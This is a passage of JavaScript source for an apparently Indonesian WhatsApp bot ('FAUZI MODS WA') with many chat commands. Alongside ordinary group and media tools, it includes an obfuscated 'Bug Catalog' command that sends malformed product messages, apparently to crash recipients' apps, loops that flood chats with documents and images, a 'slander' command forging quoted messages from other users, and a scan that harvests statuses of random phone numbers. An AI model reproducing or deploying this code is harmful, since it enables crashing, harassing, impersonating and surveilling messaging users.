if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
FAUZI.groupUpdateSubject(from, `${args.join(" ")}`)
FAUZI.sendMessage(from, ' Succes change name group', text, {quoted:ikal})
break
// Group Info ( FAUZI MODS WA )
case 'groupinfo':
if (isBan) return reply(mess.ban)
if (!isGroup) return
ppUrl = await FAUZI.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
FAUZI.sendMessage(from, buffergbl, image, {quoted: ikal, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
// Demote Admins ( FAUZI MODS WA )
case 'demote':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isGroup) return
...
FAUZI.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]}  Succes demote`
FAUZI.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[mentionede]}})
break
case 'listadmin':
...
if (kal.message.extendedTextMessage === undefined || kal.message.extendedTextMessage === null) return freply('Reply members')
mentionede = kal.message.extendedTextMessage.contextInfo.participant
FAUZI.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]}  Succes promote`
FAUZI.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[mentionede]}})
break
// Revoke Link Group ( FAUZI MODS WA )
case 'revoke':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
FAUZI.revokeInvite(from)
freply('``` Succes revoke link group```')
break
// Link Group ( FAUZI MODS WA )
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
...
if (!isGroup) return
if (!isBotGroupAdmins) return freply('Bot not admin')
linkgc = await FAUZI.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n_Nyo bisa nyo ramein_`
FAUZI.sendMessage(from, yeh, text, { quoted: ikal })
break
// Add Members ( FAUZI MODS WA )
case 'add':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
...
╰────────────────⊱
 🤭 :\n`
						...
						FAUZI.groupRemove(from, mentioned)
					} else {
						freply(`╭────────────────⊱
║> *KASIAN KENA KICK*
╰────────────────⊱
...
FAUZI.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil dibanned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
FAUZI.sendMessage(`6285791677204@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Banned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
} else if (args[0] === "del") {
if (!isBane) return reply('User tidak dibanned')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banUser))
FAUZI.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil diunban`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
FAUZI.sendMessage(`6285791677204@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Unbanned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
} else {
reply('Pilih add atau del')
}
break
// Get Pic ( FAUZI MODS WA )
case 'getp':
if (isBan) return reply(mess.ban)
try {
pic = await FAUZI.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
FAUZI.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: "Nih kak..."})
break
// Get Pic ( FAUZI MODS WA )
case 'getpic':
if (isBan) return reply(mess.ban)
...
try {
pic = await FAUZI.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
...
try {
pic = await FAUZI.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
...
break
// Get Bio ( FAUZI MODS WA )
case 'getbio':
var yy = kal.message.extendedTextMessage.contextInfo.participant
var p = await FAUZI.getStatus(`${yy}`, MessageType.text)
freply(p.status)
if (p.status == 401) {
freply("Status Profile Not Found")
}
break
// Get Name ( FAUZI MODS WA )
case 'getname':
var ambl = kal.message.extendedTextMessage.contextInfo.participant
const sname = FAUZI.contacts[ambl] != undefined ? FAUZI.contacts[ambl].sname || FAUZI.contacts[ambl].notify : undefined
freply(sname)
break
// Restart Bot ( FAUZI MODS WA )
case 'restart':
if (!kal.key.fromMe && !isOwner) return
freply('Restart...')
await exec(`pm2 restart main`, (err, stdout) => {
if (err) return FAUZI.sendMessage(from, `${err}`, text, { quoted: ikal })
if (stdout) {
console.log('Restart...')
}
})
...
if (args[0] === "1") {
						...
						FAUZI.sendMessage(from, `Bebas Nyari Hentai :v`, text)
...
if (!kal.key.fromMe) return fakestatus('APASIH')
                ...
                for (let i = 0; i < random; i++) {
                    ...
                    var anu = await FAUZI.isOnWhatsApp(`${nomer[0]}${i}@s.whatsapp.net`);
                    var bionye = await FAUZI.getStatus(`${nomer[0]}${i}@s.whatsapp.net`);
...
// Voice Google 
case 'tts':
					if (args.length < 1) return FAUZI.sendMessage(from, `Kode bahasanya mana kak? contoh :🔥➥ ${prefix}tts id yamate kudasai`, text, { quoted: ikal })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return FAUZI.sendMessage(from, `Teksnya mana kak? contoh :🔥➥ ${prefix}tts id yamate kudasai`, text, { quoted: ikal })
					...
					bby.length > 300
						...
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								...
								FAUZI.sendMessage(from, buff, audio, {  ptt: true, quoted: ikal })
								fs.unlinkSync(rano)
							})
						})
					break
// Fake Size ( FAUZI MODS WA )
case 'size':
if (args.length < 1) return freply('Masukan angkanya')
filsize = args[0]
costick = await FAUZI.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
...
FAUZI.relayWAMessage(costick)
break
// Spam Chat ( FAUZI MODS WA )
case 'spam':
if (!isOwner && !kal.key.fromMe) return
...
break
// Stop Jadibot ( FAUZI MODS WA & Vean  )
case 'stopbot':
stopjadibot(FAUZI, from, sender, kal)
break
// Jadibot ( FAUZI MODS WA & Vean  )
case 'jadibot':
if (!isOwner) return freply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
jadibot(FAUZI, from, sender, reply, kal)
break
// Antitag On / Off ( FAUZI MODS WA )
case 'antitag':
if (!kal.key.fromMe && !isOwner) return
...
media = await FAUZI.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return freply('Error!')
jadie = fs.readFileSync(rname)
FAUZI.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ikal})
fs.unlinkSync(rname)
})
break
case 'setbio':
				...
				if (args.length < 1) return freply('Teksnya?')
                anu = body.slice(9)
                FAUZI.updateProfileName(anu)
                freply(from, 'Sukses', fake)
                break
// Ngebalik Huruf ( FAUZI MODS WA )
case 'fliptext':
if (args.length < 1) return freply(`Example:\n${prefix}fliptext FAUZI`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
freply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
break
// Angka To Huruf ( FAUZI MODS WA )
case 'tohuruf':
...
FAUZI.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
...
break
// Block List ( FAUZI MODS WA & Nurutomo )
case 'blocklist':
let blockede = FAUZI.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != FAUZI.user.jid)
FAUZI.reply(m.chat, `┌「 *List Blockir* 」` + `\n` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n└────`, m, { contextInfo: { mentionedJid: blocked } })
break
// Detik Vn ( FAUZI MODS WA & Denis )
case 'detikvn':
...
FAUZI.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:ikal})
fs.unlinkSync(media)
break
// Detik Video ( FAUZI MODS WA & Denis )
case 'detikvideo':
...
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
FAUZI.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: ikal})
fs.unlinkSync(media)
break
// Sider ( FAUZI MODS WA )
case 'sider':
...
infom = await FAUZI.messageInfo(from, kal.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
...
FAUZI.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: ikal, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
FAUZI.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: ikal, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
} catch(e) {
...
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe recode FAUZI_`
FAUZI.sendMessage(from, starGame, text, {quoted: ikal, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
// Surah Al-Qur'an ( FAUZI MODS WA  )
case 'surah':
if (!kal.key.fromMe && !isOwner) return
if (args.length < 1) return freply(`Example :\n${prefix}surah 1`)
srh = args[0]
...
break
// Style Text ( FAUZI MODS WA & Nurutomo )
case 'styletext':
...
FAUZI.freply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`\n\n${value}\n\n—————————————————————————`).join`\n\n`, m)
break
...
beks = `@${noes.split("@")[0]}`
FAUZI.sendMessage(from, beks, text, {quoted:ikal, contextInfo:{mentionedJid:[noes]}})                
break
// Copy Paste ( FAUZI MODS WA & Nurutomo )
case 'q': 
if (!m.quoted) return freply('reply message!')
let qse = FAUZI.serializeM(await m.getQuotedObj())
if (!qse.quoted) return freply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
// Happy Birth Day ( FAUZI MODS WA  )
case 'hbd': 
...
`.trim()
    m.freply(teksh)
break
// Delete Private Message ( FAUZI MODS WA )
case 'deletepc':
if (!kal.key.fromMe && !isOwner) return
anu = await FAUZI.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
FAUZI.modifyChat(_.jid, 'delete', {
includeStarred: false
})
}
...
case 'delchat':
                ...
                await sleep(4000)
                FAUZI.modifyChat(from, ChatModification.delete)
                break
// Online ( FAUZI MODS WA  )
case 'on':
if (!kal.key.fromMe && !isOwner) return 
offline = false
...
FAUZI.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[fkhs], "externalAdReply":flink}})
break
    case 'off':
            if (!kal.key.fromMe && !isOwner) return 
            offline = true
...
case 'lolivid':
    ...
    case 'kontag':
            ...
            + 'END:VCARD'.trim()
            FAUZI.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            ...
            file = await FAUZI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await FAUZI.groupMetadata(from)
            ...
            FAUZI.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
    ...
    case 'totag':
            ...
            ini_buffer = fs.readFileSync(file)
            FAUZI.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            FAUZI.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            FAUZI.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
    ...
    case 'slander':
            ...
            var bot = gh.split("|")[2];
            FAUZI.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
    ...
    case 'slanderpm':
            ...
            const responye = await FAUZI.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await FAUZI.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            ...
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            FAUZI.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            case 'lirik':
...
if (isBan) return reply(mess.ban)
		    ...
		    media = await FAUZI.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `FAUZI MODS WA`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `XM-HW`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, FAUZI, kal, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
if (isBan) return reply(mess.ban)
            ...
            .on('error', (e) => {
            console.log(e)
            FAUZI.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: ikal })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            ...
            .on('exit', () => {
            FAUZI.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: ikal })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            ...
            const media = await FAUZI.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
    ...
    case 'upswteks':
            ...
            FAUZI.sendMessage('status@broadcast', `${q}`, extendedText)
    ...
    case 'upswimage':
            ...
            cihcih = await FAUZI.downloadMediaMessage(swsw)
            FAUZI.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = ` Sukses Upload Story Image dengan Caption: ${q}`
            FAUZI.sendMessage(from, bur, text, { quoted: ikal })
            } else {
    ...
    case 'upswvideo':
            ...
            cihcih = await FAUZI.downloadMediaMessage(swsw)
            FAUZI.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
    ...
    case 'fdeface':
            ...
            const tipes = await FAUZI.downloadAndSaveMediaMessage(dipes)        
    		...
    		var mat = await FAUZI.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		FAUZI.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
...
case 'tagall3':
					...
					FAUZI.sendMessage(from, teks, text, {detectLinks: false, quoted: ikal})
					break
 	case 'hidetag':
			if (!kal.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
			if (!isGroup) return freply(mess.only.group)
			...
			FAUZI.sendMessage(from, optionshidetag, text)
			break
case 'me':
       case 'profile':              
              if (isBan) return reply(mess.ban)
...
var p = await FAUZI.getStatus(`${yy}`, MessageType.text)
thumb = await getBuffer(pic)
FAUZI.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${p.status}\n➸ *Prefix :* Multi Prefix\n\n`})
}
              break
    case 'sticker': 
    case 'stiker':
    ...
    case 's':
            ...
            const media = await FAUZI.downloadAndSaveMediaMessage(encmedia)
                ...
                .on('end', function () {
                console.log('Finish')
                FAUZI.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ikal})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
...
anu = res.nowm
fto = Mthumb
FAUZI.sendMessage(from, fto, image, {quoted:ikal, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
FAUZI.sendMessage(from, khs, audio, {quoted:ikal, mimetype:'audio/mp4', filename:'FAUZIgans.mp3', ptt:true})
})
break
    case 'toimg':
	...
	case 'setfakeimg':
			...
			delb = await FAUZI.downloadMediaMessage(boij)
...
break
    case 'brainly':
			...
			FAUZI.sendMessage(from, teks, text,{quoted:ikal,detectLinks: false})                        
            })              
			break
	case 'term':
                        if (!kal.key.fromMe && !isOwner) return
...
let { size } = await FAUZI.query({ 
            ...
            var response = await FAUZI.acceptInvite(codeInvite)
            fakestatus(' Sukses')
            } catch {
    ...
    case 'tourl':
            ...
            owgi = await FAUZI.downloadMediaMessage(boij)
...
if (!kal.key.fromMe) return fakestatus('APASIH')
				...
				var bc = body.slice(6)
					...
					if (isMedia && !kal.message.videoMessage || isQuotedAudio) {
						...
						buff = await FAUZI.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							FAUZI.sendMessage(_.jid, buff, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
...
if (!kal.key.fromMe) return fakestatus('APASIH')
					...
					if (isMedia && !kal.message.videoMessage || isQuotedImage) {
						...
						buff = await FAUZI.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							FAUZI.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						freply(` Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !kal.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await FAUZI.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							FAUZI.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						freply(` Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
...
case 'ig':
	    ...
	    FAUZI.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:ikal,caption:'Nih'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            FAUZI.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:ikal,caption:'Nih'})
	    }
            }
	    })
	    break
...
case 'tovoice':
            ...
            FAUZI.sendMessage(from, buffer453, MessageType.audio, {quoted: ikal, mimetype: 'audio/mp4', ptt:true})
            fs.unlinkSync(ran)
            })
            break
    case 'tomp3':
            ...
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FAUZI.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            ...
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            FAUZI.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
...
FAUZI.sendMessage(from, fto, image, {quoted:ikal, caption:`*FACEBOOK MP4*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'fbmp3':
...
FAUZI.sendMessage(from, fto, image, {quoted:ikal, caption:`*FACEBOOK MP3*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
FAUZI.sendMessage(from, khs, audio, {quoted:ikal, mimetype:'audio/mp4', filename:'FAUZI.mp3', ptt:true})
})
break
case 'ytmp3':
if (isBan) return reply(mess.ban)
...
FAUZI.sendMessage(from, fak, MessageType.image, {quoted:ikal, caption:captions})
FAUZI.sendMessage(from, buff, MessageType.audio, {
"contextInfo": {
mimetype: 'audio/mp4',
text: 'FAUZI MODS',
...
break
	case 'play':
        ...
        case 'ytmp4':
        	...
        	return await FAUZI.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
			...
			break
// Twitter Downloader ( FAUZI MODS WA )
case 'twmp4':
if (args.length < 1) return freply('Link?')
lin = args[0]
freply(mess.wait)
...
Anu = res.SD
fto = Mthumb
FAUZI.sendMessage(from, fto, image, {quoted:ikal, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
// Twitter Downloader ( FAUZI MODS WA )
...
Anu = res.SD
fto = Mthumb
FAUZI.sendMessage(from, fto, image, {quoted:ikal, caption:`*TWITTER MP3*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
FAUZI.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'FAUZIgan.mp3', quoted:ikal, ptt:true})
})
break
case 'doc1':
if (!kal.key.fromMe) return
...
for (let i = 0; i < args[0]; i++) {
             ...
             FAUZI.sendMessage(from, anu, document, { quoted: ikal, mimetype: Mimetype.pdf, filename: `XHIRO MHONSHINE${ngazap(prefix)}.pdf`, thumbnail: ini_image })
             }
             break
case 'doc2':
if (!kal.key.fromMe) return
...
for (let i = 0; i < args[0]; i++) {
             ...
             anu = fs.readFileSync('./stik/numayei.mp3')
             FAUZI.sendMessage(from, anu, document, { quoted: ikal, mimetype: Mimetype.pdf, filename: `XHIRO MHONSHINE.pdf`, thumbnail: ini_image })
             }
             break
case 'doc3':
if (!kal.key.fromMe) return
...
case 'apa':
                    ...
                    FAUZI.sendMessage(from, assalamualikum, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    break 
                    case 'hantam':
                    const hantam = fs.readFileSync('media/hantam.mp3')
                    FAUZI.sendMessage(from, hantam, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
...
for (let i = 0; i < args[0]; i++) {
buf = Mfake
imeu = await FAUZI.prepareMessage('0@s.whatsapp.net', buf, image) 
...
"orderMessage": {
						...
						"message": "",
						"orderTitle": "Hwmods",
						"sellerJid": "62857916772049@s.whatsapp.net",
...
FAUZI.toggleDisappearingMessages(from, `${isGroup}`)
FAUZI.relayWAMessage(res)
}
break
case 'hwkal':
...
for (let i = 0; i < args[0]; i++) {
              ...
              await FAUZI.sendMessage(from, bego, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
              }
               break
// Bug Catalog ( FAUZI MODS WA )
case 'pcp':
if (!kal.key.fromMe) return
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
function _0x356a(_0x51a163,_0x59f8b5){var _0x563b22=_0x563b();return _0x356a=function(_0x356ace,_0x3879ca){_0x356ace=_0x356ace-0x1eb;var _0x229776=_0x563b22[_0x356ace];return _0x229776;},_0x356a(_0x51a163,_0x59f8b5);}var _0x26e373=_0x356a;(function(_0x12309a,_0xd85a6e){var _0x5661c3=_0x356a,_0x1d9210=_0x12309a();while(!![]){try{var _0x538baf=-parseInt(_0x5661c3(0x1fe))/0x1*(parseInt(_0x5661c3(0x1f4))/0x2)+parseInt(_0x5661c3(0x1ed))/0x3+-parseInt(_0x5661c3(0x1fa))/0x4+parseInt(_0x5661c3(0x1fc))/0x5*(-parseInt(_0x5661c3(0x1fb))/0x6)+-parseInt(_0x5661c3(0x1ef))/0x7+-parseInt(_0x5661c3(0x1f2))/0x8+parseInt(_0x5661c3(0x1f6))/0x9*(parseInt(_0x5661c3(0x1f3))/0xa);if(_0x538baf===_0xd85a6e)break;else _0x1d9210['push'](_0x1d9210['shift']());}catch(_0x13c64f){_0x1d9210['push'](_0x1d9210['shift']());}}}(_0x563b,0x2b2cc));if(!kal[_0x26e373(0x1ec)]['fromMe']&&!isOwner)return;buf=fs[_0x26e373(0x1eb)](_0x26e373(0x1f7)),imeu=await FAUZI[_0x26e373(0x1fd)]('0@s.whatsapp.net',buf,image),imeg=imeu['message']['imageMessage'],res=await FAUZI['prepareMessageFromContent'](from,{'productMessage':{'product':{'productImage':imeg,'title':emoji2(prefix),'mimetype':Mimetype[_0x26e373(0x1f5)],'description':emoji2(prefix),'thumbnail':fs[_0x26e373(0x1eb)](_0x26e373(0x1f0)),'currencyCode':_0x26e373(0x1f1),'priceAmount1000':_0x26e373(0x1ee),'productImageCount':0x1},'businessOwnerJid':_0x26e373(0x1f8),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),FAUZI[_0x26e373(0x1f9)](res);function _0x563b(){var _0x11935f=['prepareMessage','77811qVjSOM','readFileSync','key','86559FREOsT','-99999999999999999999999999999999','1065981hTVgeO','./stik/deden.jpeg','IDR','504048CqXfLS','7770xdpqDy','6RktLSP','image','10404nSNHPS','./stik/bacotah.jpeg','6285791677204@s.whatsapp.net','relayWAMessage','931512dBrTne','411726LZgbhB','5CTBxjk'];_0x563b=function(){return _0x11935f;};return _0x563b();}
}
break
case 'lokas2':            
if (!kal.key.fromMe) return
...
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
	const FAUZI5 = fs.readFileSync('./stik/deden.jpeg')
FAUZI.sendMessage(from,FAUZI5,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
}
break      
case 'kal':
if (!kal.key.fromMe) return
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
	const FAUZI4 = fs.readFileSync('./stik/bacotah.jpeg')
FAUZI.sendMessage(from,FAUZI4,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
}
break
case 'jadislayer':
if (!kal.key.fromMe) return
...
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
